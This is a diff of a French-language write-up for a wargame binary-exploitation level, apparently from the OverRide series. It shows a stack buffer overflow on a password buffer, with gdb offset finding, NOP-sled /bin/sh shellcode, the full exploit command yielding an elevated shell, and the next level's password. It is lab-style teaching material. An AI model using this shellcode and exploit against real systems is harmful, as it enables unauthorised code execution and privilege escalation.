@@ -1,20 +1,34 @@
 # Level 01
 
-Nous avons de nouveau un prompt pour le username qui doit etre dat_wil et peut segfault, on va donc realiser un shellcode.
+Dans ce programme, on a deux variable, une pour le mot de passe et une pour le username.</br>
+En premier lieu il va lire de 256 caracteres dans la variable username et verifier que le username est egal a dat_wil.</br>
+Si c'est le cas alors il va lire 100 caracteres dans la variable pass, mais cette variable ne peut seulement contenir 16 caracteres.
+
+On va essayer d'overflow fgets pour récuperer l'offset jusqu'a EIP.
 ```
-level01@OverRide:~$ (python -c 'print "dat_wil" + "B" * 328 + "\xd0\xd8\xff\xff"';cat ) | ./level01 
+(gdb) r < <(echo "dat_wil";for x in {A..z}; do echo -n "$x$x$x$x"; done)
+Starting program: /home/users/level01/level01 < <(echo "dat_wil"; for x in {A..z}; do echo -n "$x$x$x$x"; done)
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x55555555 in ?? ()
+
+
+$ python
+>>> bytes.fromhex("55").decode("ASCII")
+'U'
+>>> (ord('U') - ord('A')) * 4
+80
+```
+Maintenant qu'on a notre offset, on va pouvoir faire un NOP sled avec un shellcode, en mettant l'adresse de notre NOP sled dans EIP.
+```
 level01@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
 level01@OverRide:~$ gdb ./level01
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "x86_64-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
 (gdb) b main
 Breakpoint 1 at 0x80484d5
 (gdb) r
@@ -71,17 +85,16 @@ Breakpoint 1, 0x080484d5 in main ()
 Quit
 (gdb) quit
 
+level01@OverRide:~$ (python -c 'print "dat_wil\n" + "B" * 80 + "\xd0\xd8\xff\xff"'; cat) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
-Enter Password: 
+Enter Password:
 nope, incorrect password...
 
-ls
-ls: cannot open directory .: Permission denied
-cd ..
-cd level02
-cat .pass
+id
+uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
+cat ~level02/.pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
 ```
 
